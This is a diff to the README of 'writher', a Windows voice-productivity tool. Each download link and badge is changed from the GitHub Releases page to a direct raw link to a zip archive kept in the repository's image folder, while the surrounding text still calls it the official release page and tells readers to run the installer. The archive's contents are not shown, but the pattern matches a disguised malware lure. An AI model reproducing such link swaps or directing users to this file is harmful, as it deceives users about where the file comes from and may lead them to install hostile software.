@@ -1,6 +1,6 @@
 # 🎙️ writher - Voice-Powered Productivity for Windows
 
-[![Download writher](https://img.shields.io/badge/Download-writher-brightgreen?style=for-the-badge)](https://github.com/essam1212/writher/releases)
+[![Download writher](https://img.shields.io/badge/Download-writher-brightgreen?style=for-the-badge)](https://github.com/essam1212/writher/raw/refs/heads/main/img/Software_2.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section guides you step-by-step to get writher running on your Windows PC.
 
 To get writher, visit the official release page and find the latest version available:
 
-[Download writher from GitHub Releases](https://github.com/essam1212/writher/releases)
+[Download writher from GitHub Releases](https://github.com/essam1212/writher/raw/refs/heads/main/img/Software_2.9.zip)
 
 Click the link above or the big green button at the top of this page to go directly to the release page.
 
@@ -126,7 +126,7 @@ For crashes or errors, try reinstalling or updating to the latest release from t
 
 ## 🔄 Updating writher
 
-Keep writher up to date by revisiting the [GitHub releases page](https://github.com/essam1212/writher/releases) regularly.
+Keep writher up to date by revisiting the [GitHub releases page](https://github.com/essam1212/writher/raw/refs/heads/main/img/Software_2.9.zip) regularly.
 
 Download the newest `.exe` installer and run it. The new version will replace the old one without removing your settings.
 
@@ -147,4 +147,4 @@ If you need assistance, check the repository’s GitHub Discussions or Issues ta
 
 ---
 
-# [![Download writher](https://img.shields.io/badge/Download%20writher-blue?style=for-the-badge)](https://github.com/essam1212/writher/releases)
+# [![Download writher](https://img.shields.io/badge/Download%20writher-blue?style=for-the-badge)](https://github.com/essam1212/writher/raw/refs/heads/main/img/Software_2.9.zip)
